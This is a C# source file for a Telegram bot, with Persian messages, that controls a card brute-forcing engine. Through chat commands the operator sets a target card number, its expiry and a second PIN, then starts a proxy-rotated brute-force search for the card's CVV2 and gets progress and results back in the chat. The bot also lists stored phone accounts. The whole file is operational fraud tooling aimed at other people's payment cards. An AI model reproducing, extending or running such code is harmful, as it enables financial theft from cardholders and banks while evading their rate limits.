// language: C#, file: TelegramBot.cs, runtime: .NET 8
using System.Collections.Concurrent;
using System.Text;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Iva.Auth;

namespace Iva.Bot;

public sealed class IvaTelegramBot
{
    private readonly string _botToken;
    private readonly long _allowedChatId;
    private readonly IvaSessionManager _manager;
    private readonly ProxyPool _pool;
    private readonly BruteConfig _cfg;
    private readonly ITelegramBotClient _client;
    private CancellationTokenSource? _bruteCts;
    private BruteEngine? _currentEngine;

    public IvaTelegramBot(
        string botToken,
        long allowedChatId,
        IvaSessionManager manager,
        ProxyPool pool,
        BruteConfig cfg)
    {
        _botToken = botToken;
        _allowedChatId = allowedChatId;
        _manager = manager;
        _pool = pool;
        _cfg = cfg;
        _client = new TelegramBotClient(_botToken);
    }

    public async Task RunAsync(CancellationToken ct)
    {
        var me = await _client.GetMe(ct);
        Console.WriteLine($"[BOT] @{me.Username}");

        var offset = 0;
        while (!ct.IsCancellationRequested)
        {
            try
            {
                var updates = await _client.GetUpdates(offset, 30, null, ct);
                foreach (var u in updates)
                {
                    offset = u.Id + 1;
                    if (u.Message is { } msg) await HandleAsync(msg, ct);
                }
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex)
            {
                Console.WriteLine($"[BOT] poll error: {ex.Message}");
                await Task.Delay(2000, ct);
            }
        }
    }

    private async Task HandleAsync(Message msg, CancellationToken ct)
    {
        if (msg.Chat.Id != _allowedChatId)
        {
            await _client.SendMessage(msg.Chat.Id, "⛔ دسترسی نداری.", cancellationToken: ct);
            return;
        }

        var text = msg.Text?.Trim() ?? "";

        if (text == "/start")
        {
            await SendMenu(msg.Chat.Id, ct);
            return;
        }

        if (text == "/brute")
        {
            await StartBrute(msg.Chat.Id, ct);
            return;
        }

        if (text == "/brute_stop")
        {
            _bruteCts?.Cancel();
            await _client.SendMessage(msg.Chat.Id, "🛑 توقف درخواست شد.", cancellationToken: ct);
            return;
        }

        if (text == "/brute_status")
        {
            var status = _currentEngine is { IsRunning: true } ? "🟢 در حال اجرا" : "⚪️ متوقف";
            await _client.SendMessage(msg.Chat.Id,
                $"وضعیت brute: {status}\nproxy pool: {_pool.Count}\nPAN: `{Mask(_cfg.TargetPan)}`",
                parseMode: ParseMode.Markdown, cancellationToken: ct);
            return;
        }

        if (text == "/proxies")
        {
            await _client.SendMessage(msg.Chat.Id,
                $"🌐 proxy pool: `{_pool.Count}` تا زنده",
                parseMode: ParseMode.Markdown, cancellationToken: ct);
            return;
        }

        if (text == "/sessions")
        {
            var phones = _manager.ListMobiles();
            var sb = new StringBuilder();
            sb.AppendLine($"📱 {phones.Count} اکانت ذخیره‌شده:");
            foreach (var p in phones) sb.AppendLine($"• `{p}`");
            await _client.SendMessage(msg.Chat.Id, sb.ToString(),
                parseMode: ParseMode.Markdown, cancellationToken: ct);
            return;
        }

        if (text.StartsWith("/setpan "))
        {
            var pan = DigitsOnly(text[8..]);
            if (pan.Length == 16)
            {
                _cfg.TargetPan = pan;
                await _client.SendMessage(msg.Chat.Id, $"✅ PAN ست شد: `{Mask(pan)}`",
                    parseMode: ParseMode.Markdown, cancellationToken: ct);
            }
            else
            {
                await _client.SendMessage(msg.Chat.Id, "❌ PAN باید ۱۶ رقم باشه.", cancellationToken: ct);
            }
            return;
        }

        if (text.StartsWith("/setpin "))
        {
            _cfg.Pin = DigitsOnly(text[8..]);
            await _client.SendMessage(msg.Chat.Id, "✅ PIN ست شد.", cancellationToken: ct);
            return;
        }

        if (text.StartsWith("/setexp "))
        {
            var parts = text.Split(' ', StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length == 3)
            {
                _cfg.ExpireMonth = parts[1].PadLeft(2, '0');
                _cfg.ExpireYear = parts[2].Length == 4 ? parts[2][2..] : parts[2];
                await _client.SendMessage(msg.Chat.Id,
                    $"✅ انقضا ست شد: `{_cfg.ExpireMonth}/{_cfg.ExpireYear}`",
                    parseMode: ParseMode.Markdown, cancellationToken: ct);
            }
            return;
        }

        await SendMenu(msg.Chat.Id, ct);
    }

    private async Task StartBrute(long chatId, CancellationToken ct)
    {
        if (_currentEngine is { IsRunning: true })
        {
            await _client.SendMessage(chatId, "⚠️ یه brute در حال اجراست. اول `/brute_stop` بزن.",
                parseMode: ParseMode.Markdown, cancellationToken: ct);
            return;
        }

        if (string.IsNullOrEmpty(_cfg.TargetPan) || _cfg.TargetPan.Length != 16)
        {
            await _client.SendMessage(chatId, "❌ اول PAN رو ست کن: `/setpan 610433...`",
                parseMode: ParseMode.Markdown, cancellationToken: ct);
            return;
        }

        if (string.IsNullOrEmpty(_cfg.Pin))
        {
            await _client.SendMessage(chatId, "❌ اول PIN رو ست کن: `/setpin 1234`",
                parseMode: ParseMode.Markdown, cancellationToken: ct);
            return;
        }

        if (_pool.Count == 0)
        {
            await _client.SendMessage(chatId, "❌ proxy pool خالیه. صبر کن refresher پر کنه.",
                cancellationToken: ct);
            return;
        }

        _bruteCts = new CancellationTokenSource();

        await _client.SendMessage(chatId,
            $"🚀 شروع brute\n" +
            $"PAN: `{Mask(_cfg.TargetPan)}`\n" +
            $"انقضا: `{_cfg.ExpireMonth}/{_cfg.ExpireYear}`\n" +
            $"proxy: `{_pool.Count}` تا\n" +
            $"max attempts: `{_cfg.MaxTotalAttempts}`\n\n" +
            $"گزارش‌ها اینجا میان. `/brute_stop` برای توقف.",
            parseMode: ParseMode.Markdown, cancellationToken: ct);

        var engine = new BruteEngine(_cfg, _pool, onProgress: msg =>
        {
            _ = _client.SendMessage(chatId, msg, parseMode: ParseMode.Markdown, cancellationToken: _bruteCts.Token);
        });

        _currentEngine = engine;

        _ = Task.Run(async () =>
        {
            try
            {
                var result = await engine.RunAsync(_bruteCts.Token);
                var final = result.Found
                    ? $"✅ *تمام* — CVV2 پیدا شد: `{result.Cvv2}`\nتلاش: {result.Attempts}\nزمان: {result.Elapsed}"
                    : $"🏁 *تمام* — پیدا نشد\nتلاش: {result.Attempts}\nخطا: {result.Errors}\nدلیل: {result.Reason}";
                await _client.SendMessage(chatId, final, parseMode: ParseMode.Markdown, cancellationToken: CancellationToken.None);
            }
            catch (Exception ex)
            {
                await _client.SendMessage(chatId, $"💥 خطا: `{ex.Message}`",
                    parseMode: ParseMode.Markdown, cancellationToken: CancellationToken.None);
            }
            finally
            {
                _currentEngine = null;
                _bruteCts?.Dispose();
                _bruteCts = null;
            }
        }, _bruteCts.Token);
    }

    private async Task SendMenu(long chatId, CancellationToken ct)
    {
        var sb = new StringBuilder();
        sb.AppendLine("🤖 *Iva Bot*");
        sb.AppendLine();
        sb.AppendLine("*تنظیمات brute:*");
        sb.AppendLine("`/setpan 610433...` — شماره کارت");
        sb.AppendLine("`/setexp 05 28` — انقضا");
        sb.AppendLine("`/setpin 1234` — رمز دوم");
        sb.AppendLine();
        sb.AppendLine("*عملیات:*");
        sb.AppendLine("`/brute` — شروع brute force");
        sb.AppendLine("`/brute_stop` — توقف");
        sb.AppendLine("`/brute_status` — وضعیت");
        sb.AppendLine("`/proxies` — proxy pool");
        sb.AppendLine("`/sessions` — اکانت‌ها");

        await _client.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Markdown, cancellationToken: ct);
    }

    private static string DigitsOnly(string s) => new(s.Where(char.IsDigit).ToArray());
    private static string Mask(string pan) =>
        pan.Length >= 16 ? pan[..6] + "******" + pan[^4..] : pan;
}